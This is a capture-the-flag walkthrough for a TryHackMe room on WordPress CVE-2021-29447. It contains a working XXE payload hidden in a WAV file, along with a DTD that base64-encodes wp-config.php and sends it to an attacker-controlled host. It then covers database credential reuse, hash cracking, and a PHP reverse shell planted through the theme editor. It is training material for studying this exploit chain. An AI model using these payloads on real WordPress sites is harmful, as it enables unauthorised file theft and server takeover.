Room: [Wordpress: CVE-2021-29447](https://tryhackme.com/room/wordpresscve202129447)

Difficulty: Medium

Overview: This is a semi-guided challenge room. We will exploit a Wordpress server through a WAV file that will allow us to read the contents of a sensitive file. Gaining access to mysql database to finaly get our foot in machine by using Wordpress themes editor.

------------------------------------------------------------------------------------------------------------------------------------------------------------------

As usual we will start our enumeration by running “nmap” to search for all open ports on the target system:

```
nmap -sV -sC -p- wordpress.thm -oN nmap.txt

-sV → Probe open ports to determine service
-sC → Scan using the default set of scripts
-p- → Scan all ports
-oN → Save the ouput of the scan in a file
```

![image](https://user-images.githubusercontent.com/76821053/131554897-778e3a32-8854-4197-a272-734d49759a2d.png)

Since this room is a semi guided challenge we will exploit the http web server on port 80 that was built with Wordpress. 

![image](https://user-images.githubusercontent.com/76821053/131554922-bee65342-5aee-476f-90a1-b7405fbf7a87.png)

To bypass the login portal and access the user dashboard we are going to use the credentials that were given in the previous task: 

![image](https://user-images.githubusercontent.com/76821053/131554952-53b74961-1ec5-4d08-ad45-f8ae03e717e3.png)

How to find the login portal path? We can use google to search for it, or we can also use “gobuster” to search for any hidden files or directories, which is always a good practice:

```
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --url http://wordpress.thm -x .txt,.log,.php,.html
```

![image](https://user-images.githubusercontent.com/76821053/131554975-40176714-c2af-4488-953a-698136312558.png)

The login portal's path is at "/wp-login.php":

![image](https://user-images.githubusercontent.com/76821053/131555006-cd5cb3fd-89e8-40bc-9582-f78d816f5a7b.png)

Insert the credentials and we are greated by the user dashboard:

![image](https://user-images.githubusercontent.com/76821053/131555046-d78ec0b5-233b-4529-b2d4-06edce25fee8.png)

We can see that the version of this Wordpress web server is 5.6.2 and it has a CVE-2021-29447. This CVE tells us that a user with the ability to upload files can exploit an XML parsing issue in the Media Library leading to XXE attacks. This requires WordPress installation to be using PHP 8. 

Access to internal files is possible in a successful XXE attack. So let's follow the step by step POC (proof of concept) in task 1 of this room:

1. Create a malicious wave file:

```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

![image](https://user-images.githubusercontent.com/76821053/131555072-339bd7ed-1bbe-4e7e-88b5-0006909b0347.png)

In my payload i changed the ip address and port to match my attacker machine. You can check your ip address with the command "ifconfig".

I also changed the name of “NAMEEVIL.dtd” to “payload.dtd”. It is important that this file has an extention of ".dtd".

2. Create a dtd file with the same name has the "NAMEEVIL.dtd" or with the one that you have chosen before. And, we will have to make some slightly changes:

In this payload we need to change the path of the file that we want to read. In the POC the payload reads "/etc/passwd", so we have to change this to read “wp-config.php”.

Every linux server by default is at “/var/www/html" so the config file must be in this path.

```
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/html/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```

In the second part of the payload only change the ip address and port to match your own.

![image](https://user-images.githubusercontent.com/76821053/131555138-dceb62ee-81c9-491c-abd3-654aadd8f5d6.png)

Now that we have created our payloads we have two files in our directory:

![image](https://user-images.githubusercontent.com/76821053/131555162-f4d21a81-2795-4426-b72b-77868a276ecd.png)

3. Before we upload the .wav file to the Wordpress server we have to host an http server in the same directory as the dtd file:

```
php -S 0.0.0.0:8000
```

This php http server have to be listening on the port that we chose for the payloads.

![image](https://user-images.githubusercontent.com/76821053/131555197-c06d68c4-7ab0-4c24-8657-d59930bcf6fa.png)

4. Time to upload the .wav file:

Go to Media tab and just select the .wav payload.

![image](https://user-images.githubusercontent.com/76821053/131555255-60875794-3784-4657-b5bb-1044eb7e55d7.png)

This will execute code on the webserver, it will fetch the dtd file and we will see information stored in the requests off our php HTTP server logs:

![image](https://user-images.githubusercontent.com/76821053/131555293-e96c8d12-ad16-48f0-bf34-7f79a7bbdcea.png)

5. To read the contents of the request we can use this php one liner:

```
<?php echo zlib_decode(base64_decode('base64here')); ?>
```

Create a .php file with the one liner and copy the encoded data from the your php request log and paste it to “base64here”.

![image](https://user-images.githubusercontent.com/76821053/131555314-0af8c5a2-c6de-42f8-9af7-cfafae609d0d.png)

To read it we just do:

```
php filename.php
```

![image](https://user-images.githubusercontent.com/76821053/131555341-c4137e10-81d6-4738-a49a-afa789882614.png)

Success we managed to read the contents of wp-config.php. Inside are database credentials that we'll be taking advantage next.

Looking at the nmap scan we can see that mysql is running on this system. Let's connect to it with the credentials that we have found above:

```
myslq -h wordpress.thm -u USERNAME -p

-h → To specify the URL
-u → Put the username from the database
-p → For connecting with a password
```

![image](https://user-images.githubusercontent.com/76821053/131555375-7c574c84-7b4f-4a57-8a6c-cb112d2a718e.png)

To navigate mysql service, we can start by listing all databases available:

```
show databases;
```

![image](https://user-images.githubusercontent.com/76821053/131555403-b242c4e7-2b07-47bd-a2b3-ece2495ec92c.png)

Now we have to select the correct dabatase and list all the tables inside:

```
use wordpressdb2

show tables;
```

![image](https://user-images.githubusercontent.com/76821053/131555434-78dd0584-11bf-48af-9e11-9612154b63c6.png)

The table that calls out for attention is wptry_users. To dump its contents we can use this command:

```
SELECT * FROM wptry_users;
```

![image](https://user-images.githubusercontent.com/76821053/131555456-4443a6d8-61d2-4700-8959-a919e1561e5f.png)

We have found our user id 1 and his password hash. 

This hash is encryted in MD5. There is a tool called "hash-identifier" that can parse hashes and identify its encryption:

![image](https://user-images.githubusercontent.com/76821053/131555494-9006149d-9f6d-4bb5-845b-391cf46650a1.png)

Now that we know have a hash and now its encryption type it is time to use “John the Ripper”.

But first we need to put this hash into a .txt file and send it to "john":

```
echo 'MYSQL_HASH' > hash.txt

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![image](https://user-images.githubusercontent.com/76821053/131555533-65f6b2cc-6406-49cf-b2b3-1f020842afaa.png)

Now we have new credentials and they also belong to the Wordpress server.

How can we compromise the machine and get a reverse shell?

We can leverage the fact that we have access to the “admin” dashboard in the wordpress server. And, by editing the appearance of the web page we will get a reverse shell.

To be more specific let's review the steps:

• Create a php reverse shell with "msfvenom" or use the awesome php reverse shell from [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell). 

• In the Wordpress server go to "Apperance/Theme Editor" tab and select "Twenty Twenty" .

• Choose a php theme file. I used “404 Template” and overwrite its contents with the php reverse shell payload:

![image](https://user-images.githubusercontent.com/76821053/131555575-2844f4e2-695d-4938-95fe-f6cd96350e49.png)

• If you are using the payload from Pentestmonkey you have to change the ip address and port that i marked with arrows.

• Start a netcat listener on the same port as the payload.

• To trigger the payload we have to access “Themes” tab select “Twenty Twenty” and press “Live Priview”:

![image](https://user-images.githubusercontent.com/76821053/131555602-37116fd4-c554-4890-b221-b0f3d3e85d8d.png)

• Finaly just press any of the contents of the live preview and in your shell you will recieve a connection from the server:

![image](https://user-images.githubusercontent.com/76821053/131555632-d72a7652-c99b-404e-93e3-8dfd4e002a58.png)

Success we have access to the target machine. 

The final flag is at “stux" home directory:

![image](https://user-images.githubusercontent.com/76821053/131555648-438bfaad-cf7a-414c-ada8-fe87f212fb02.png)








































